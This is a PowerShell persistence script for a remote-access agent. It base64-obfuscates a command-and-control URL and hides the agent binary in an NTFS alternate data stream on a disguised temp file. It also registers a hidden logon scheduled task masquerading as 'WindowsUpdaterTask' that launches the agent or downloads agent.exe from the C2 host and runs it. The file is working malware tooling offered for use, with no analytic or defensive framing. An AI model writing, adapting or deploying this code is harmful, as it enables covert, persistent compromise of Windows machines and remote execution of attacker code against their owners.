param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

# ============================================================
# Configuration – Change YOUR_C2_URL to your actual C2 base
# ============================================================
$encodedUrl = "aHR0cHM6Ly9jMi1zZXJ2ZXJ2Mi1xeHZsLm9ucmVuZGVyLmNvbQ=="
$c2BaseUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedUrl))

# ============================================================
# 1. Carrier file in C:\Windows\Temp
# ============================================================
$carrierDir = "C:\Windows\Temp"
$carrierFile = "$carrierDir\~DF539A.tmp"
$streamName = "thumbs.db"

# Create carrier if it doesn't exist
if (-not (Test-Path $carrierFile)) {
    Set-Content -Path $carrierFile -Value "[Temp File]" -Encoding ASCII
    Write-Output "[+] Created carrier file: $carrierFile"
} else {
    Write-Output "[+] Using existing carrier file: $carrierFile"
}

# ============================================================
# 2. Hide the real agent in ADS
# ============================================================
Write-Output "[+] Hiding real agent in ADS..."
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $carrierFile -Stream $streamName -Value $agentBytes -Encoding Byte
$hiddenPath = "$carrierFile`:$streamName"
Write-Output "[+] Real agent hidden at: $hiddenPath"

# ============================================================
# 3. Build the scheduled task action (with self‑healing)
# ============================================================
$taskName = "WindowsUpdaterTask"

# The command that will run at logon
$extractCommand = @"
`$carrierFile = '$carrierFile'
`$streamName = '$streamName'
`$tempPath = "`$env:TEMP\agent.exe"
`$agentUrl = '$c2BaseUrl/agent.exe'

# Try to extract from carrier
if (Test-Path `$carrierFile) {
    `$bytes = Get-Content -Path `$carrierFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
    if (`$bytes) {
        [System.IO.File]::WriteAllBytes(`$tempPath, `$bytes)
        Start-Process -WindowStyle Hidden `$tempPath
        exit
    }
}

# Fallback: download fresh agent
try {
    Invoke-WebRequest -Uri `$agentUrl -OutFile `$tempPath -ErrorAction Stop
} catch {
    exit
}

# Recreate carrier file with hidden agent for next boot
if (Test-Path `$tempPath) {
    `$newBytes = [System.IO.File]::ReadAllBytes(`$tempPath)
    # Ensure carrier file exists
    if (-not (Test-Path `$carrierFile)) {
        Set-Content -Path `$carrierFile -Value "[Temp File]" -Encoding ASCII
    }
    Set-Content -Path `$carrierFile -Stream `$streamName -Value `$newBytes -Encoding Byte
    Start-Process -WindowStyle Hidden `$tempPath
}
"@

# Escape the command for use in a scheduled task action
$commandLine = "powershell.exe -WindowStyle Hidden -Command `"$extractCommand`""

# ============================================================
# 4. Create/update scheduled task via COM
# ============================================================
try {
    $taskService = New-Object -ComObject Schedule.Service
    $taskService.Connect()
    $rootFolder = $taskService.GetFolder("\")

    # Delete existing task if any
    try { $rootFolder.DeleteTask($taskName, 0) } catch { }

    # Create new task definition
    $taskDefinition = $taskService.NewTask(0)
    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
    $taskDefinition.Principal.UserId = $env:USERNAME
    $taskDefinition.Principal.LogonType = 3  # TASK_LOGON_INTERACTIVE_TOKEN

    # Add logon trigger
    $trigger = $taskDefinition.Triggers.Create(9)  # TASK_TRIGGER_LOGON
    $trigger.UserId = $env:USERNAME

    # Add action
    $action = $taskDefinition.Actions.Create(0)  # TASK_ACTION_EXEC
    $action.Path = "powershell.exe"
    $action.Arguments = "-WindowStyle Hidden -Command `"$extractCommand`""

    # Register task (6 = UpdateOrCreate)
    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
    Write-Output "[+] Scheduled task '$taskName' created via COM. Agent will run at next logon."
} catch {
    Write-Output "[-] Failed to create scheduled task: $_"
}

# ============================================================
# 5. Done – original agent remains (you may delete it later)
# ============================================================
Write-Output ""
Write-Output "✅ PERSISTENCE COMPLETE"
Write-Output "Real agent hidden in: $hiddenPath"
Write-Output "Original agent still at: $agentPath (you may delete it after reboot)"
Write-Output "If the hidden file is ever deleted, the scheduled task will auto‑recover by downloading from C2."